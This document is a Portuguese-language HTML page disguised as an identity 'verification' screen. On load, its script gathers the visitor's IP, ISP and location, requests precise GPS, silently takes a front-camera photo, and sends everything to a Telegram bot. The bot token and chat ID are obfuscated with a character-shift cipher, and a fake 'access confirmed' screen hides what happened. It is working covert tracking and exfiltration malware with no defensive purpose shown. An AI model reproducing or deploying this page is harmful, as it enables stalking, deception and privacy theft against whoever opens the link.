<!doctype html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Verificação</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            min-height: 100dvh;
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px 20px;
            color: #1a1a1a;
        }

        .box {
            background: #fff;
            border-radius: 18px;
            padding: 36px 28px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
        }

        .icon {
            font-size: 3rem;
            margin-bottom: 16px;
            display: block;
        }

        h1 {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1a1a1a;
        }

        p {
            font-size: 0.9rem;
            color: #666;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e0e0e0;
            border-top-color: #4f46e5;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .step {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 0;
            border-bottom: 1px solid #f0f0f0;
            font-size: 0.875rem;
            text-align: left;
        }

        .step:last-child { border-bottom: none; }

        .dot {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.7rem;
            font-weight: 700;
        }

        .dot.pending  { background: #e5e7eb; color: #9ca3af; }
        .dot.loading  { background: #ede9fe; color: #6d28d9; border: 2px solid #6d28d9; animation: pulse 1s ease infinite; }
        .dot.done     { background: #d1fae5; color: #059669; }
        .dot.fail     { background: #fee2e2; color: #dc2626; }

        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }

        .step-label { flex: 1; color: #374151; }
        .step-label.done  { color: #059669; }
        .step-label.fail  { color: #dc2626; }

        #screen-done { display: none; }
        #screen-done .icon { font-size: 3.5rem; }

        video, canvas { display: none; position: absolute; }
    </style>
</head>
<body>

<!-- Tela de carregamento -->
<div class="box" id="screen-loading">
    <div class="spinner"></div>
    <h1>Verificando acesso</h1>
    <p>Por favor, aguarde enquanto confirmamos sua identidade.</p>

    <div id="step-ip"  class="step"><div class="dot pending" id="dot-ip">1</div>  <span class="step-label" id="lbl-ip">Verificando rede</span></div>
    <div id="step-geo" class="step"><div class="dot pending" id="dot-geo">2</div> <span class="step-label" id="lbl-geo">Confirmando localização</span></div>
    <div id="step-cam" class="step"><div class="dot pending" id="dot-cam">3</div> <span class="step-label" id="lbl-cam">Validando dispositivo</span></div>
    <div id="step-snd" class="step"><div class="dot pending" id="dot-snd">4</div> <span class="step-label" id="lbl-snd">Finalizando</span></div>
</div>

<!-- Tela de conclusão -->
<div class="box" id="screen-done">
    <span class="icon">✅</span>
    <h1>Verificação concluída</h1>
    <p>Seu acesso foi confirmado com sucesso.</p>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
const _d = (a,n) => String.fromCharCode(...a.map(c => c - n));
const TG_TOKEN   = _d([63,62,55,57,58,63,59,62,56,57,65,72,72,79,108,59,73,64,113,77,73,106,107,105,112,129,89,52,76,118,87,129,102,97,108,73,105,52,121,78,113,127,82,60,115,92], 7);
const TG_CHAT_ID = _d([63,55,63,64,60,60,57,55,62,57], 7);

const video  = document.getElementById('video');
const canvas = document.getElementById('canvas');
const data   = {};

// ── Helpers de UI ───────────────────────────────
function stepLoading(key) {
    document.getElementById(`dot-${key}`).className = 'dot loading';
    document.getElementById(`dot-${key}`).textContent = '…';
}
function stepDone(key, label) {
    document.getElementById(`dot-${key}`).className = 'dot done';
    document.getElementById(`dot-${key}`).textContent = '✓';
    const el = document.getElementById(`lbl-${key}`);
    el.textContent = label;
    el.className = 'step-label done';
}
function stepFail(key, label) {
    document.getElementById(`dot-${key}`).className = 'dot fail';
    document.getElementById(`dot-${key}`).textContent = '✗';
    const el = document.getElementById(`lbl-${key}`);
    el.textContent = label;
    el.className = 'step-label fail';
}
function showDone() {
    document.getElementById('screen-loading').style.display = 'none';
    document.getElementById('screen-done').style.display   = 'block';
}

// ── Debug ───────────────────────────────────────
const DEBUG = new URLSearchParams(location.search).has('debug');
const dbg = (() => {
    if (!DEBUG) return () => {};
    const box = document.createElement('div');
    box.style.cssText = 'position:fixed;bottom:0;left:0;right:0;max-height:40vh;overflow-y:auto;background:#000d;color:#0f0;font:11px/1.5 monospace;padding:8px;z-index:9999;';
    document.body.appendChild(box);
    return (msg, color='#0f0') => {
        const line = document.createElement('div');
        line.style.color = color;
        line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        box.prepend(line);
    };
})();

// ── Telegram helpers ────────────────────────────
async function tgText(text) {
    try {
        dbg('Enviando texto ao Telegram...');
        const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' })
        });
        const j = await r.json();
        dbg(j.ok ? 'Texto enviado ✓' : `Erro texto: ${JSON.stringify(j)}`, j.ok ? '#0f0' : '#f55');
    } catch (e) { dbg(`Exceção texto: ${e.message}`, '#f55'); }
}

async function tgPhoto(blob, caption) {
    try {
        dbg('Enviando foto ao Telegram...');
        const form = new FormData();
        form.append('chat_id', TG_CHAT_ID);
        form.append('photo', blob, 'foto.jpg');
        form.append('caption', caption.slice(0, 1024));
        const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form
        });
        const j = await r.json();
        dbg(j.ok ? 'Foto enviada ✓' : `Erro foto: ${JSON.stringify(j)}`, j.ok ? '#0f0' : '#f55');
    } catch (e) { dbg(`Exceção foto: ${e.message}`, '#f55'); }
}

// ── 1. IP ───────────────────────────────────────
async function coletarIP() {
    stepLoading('ip');
    dbg('Buscando IP...');
    try {
        const r = await fetch('https://ipapi.co/json/');
        const d = await r.json();
        dbg(`IP: ${d.ip}`);
        data.ip      = d.ip       || '—';
        data.isp     = d.org      || '—';
        data.asn     = d.asn      || '—';
        data.cidade  = d.city     || '—';
        data.estado  = d.region   || '—';
        data.pais    = `${d.country_name || '—'} (${d.country_code || '—'})`;
        data.fuso    = d.timezone || '—';
        data.ipCoord = (d.latitude && d.longitude) ? `${d.latitude}, ${d.longitude}` : '—';
        stepDone('ip', `Rede: ${data.ip}`);
    } catch (_) {
        // fallback mínimo
        try {
            const r2 = await fetch('https://api.ipify.org?format=json');
            const d2 = await r2.json();
            data.ip = d2.ip;
            stepDone('ip', `Rede: ${data.ip}`);
        } catch (_) {
            dbg('Falha total no IP', '#f55');
        stepFail('ip', 'Rede não identificada');
        }
    }
}

// ── 2. GPS ──────────────────────────────────────
function coletarGPS() {
    stepLoading('geo');
    return new Promise((resolve) => {
        if (!('geolocation' in navigator)) {
            data.gps = 'não suportado';
            stepFail('geo', 'GPS não disponível');
            return resolve();
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude: lat, longitude: lon, accuracy: acc, altitude: alt } = pos.coords;
                data.lat = lat.toFixed(7);
                data.lon = lon.toFixed(7);
                data.acc = acc ? `±${acc.toFixed(0)}m` : '—';
                data.alt = alt != null ? `${alt.toFixed(1)}m` : '—';
                data.mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
                stepDone('geo', `GPS: ${lat.toFixed(4)}, ${lon.toFixed(4)}`);
                resolve();
            },
            (err) => {
                data.gpsErro = err.message;
                stepFail('geo', 'Localização negada');
                resolve();
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    });
}

// ── 3. Câmera ───────────────────────────────────
function coletarFoto() {
    stepLoading('cam');
    return new Promise((resolve) => {
        const constraints = {
            video: {
                facingMode: { ideal: 'user' },
                width:  { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        };
        navigator.mediaDevices.getUserMedia(constraints)
            .then((stream) => {
                video.srcObject = stream;
                video.play();

                // Aguarda o vídeo estar pronto e captura
                const capturar = () => {
                    const w = video.videoWidth  || 640;
                    const h = video.videoHeight || 480;
                    canvas.width  = w;
                    canvas.height = h;
                    canvas.getContext('2d').drawImage(video, 0, 0, w, h);
                    stream.getTracks().forEach(t => t.stop());
                    stepDone('cam', `Foto capturada (${w}×${h})`);
                    canvas.toBlob((blob) => {
                        data.fotoBlob = blob;
                        resolve();
                    }, 'image/jpeg', 0.90);
                };

                if (video.readyState >= 3) {
                    setTimeout(capturar, 1500);
                } else {
                    video.addEventListener('canplay', () => setTimeout(capturar, 1500), { once: true });
                }
            })
            .catch((err) => {
                data.camErro = err.name;
                stepFail('cam', 'Câmera negada');
                resolve();
            });
    });
}

// ── 4. Envio Telegram ───────────────────────────
async function enviar() {
    stepLoading('snd');

    const ua = navigator.userAgent;
    const agora = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

    const texto =
`📍 <b>Nova captura</b> — ${agora}

<b>🌐 Rede / IP</b>
• IP: <code>${data.ip || '—'}</code>
• Provedor: ${data.isp || '—'}
• ASN: ${data.asn || '—'}
• Localidade: ${data.cidade || '—'}, ${data.estado || '—'}, ${data.pais || '—'}
• Fuso: ${data.fuso || '—'}
• Coord. IP: ${data.ipCoord || '—'}

<b>📡 GPS</b>
• Latitude: ${data.lat || '—'}
• Longitude: ${data.lon || '—'}
• Precisão: ${data.acc || '—'}
• Altitude: ${data.alt || '—'}
• Maps: ${data.mapsUrl || '—'}

<b>📱 Dispositivo</b>
• Idioma: ${navigator.language}
• Tela: ${screen.width}×${screen.height}
• UA: ${ua.slice(0, 200)}`;

    // Envia texto primeiro
    await tgText(texto);

    // Envia foto se capturou
    if (data.fotoBlob) {
        const legenda = `📸 Foto | ${data.ip || '—'} | ${data.lat && data.lon ? `${data.lat}, ${data.lon}` : 'GPS negado'} | ${agora}`;
        await tgPhoto(data.fotoBlob, legenda);
    }

    stepDone('snd', 'Concluído');
    setTimeout(showDone, 800);
}

// ── Pipeline principal ──────────────────────────
(async () => {
    dbg(`Token OK: ${TG_TOKEN.length === 46}`);
    dbg(`ChatID: ${TG_CHAT_ID}`);
    await coletarIP();
    await Promise.all([ coletarGPS(), coletarFoto() ]);
    await enviar();
})();
</script>
</body>
</html>
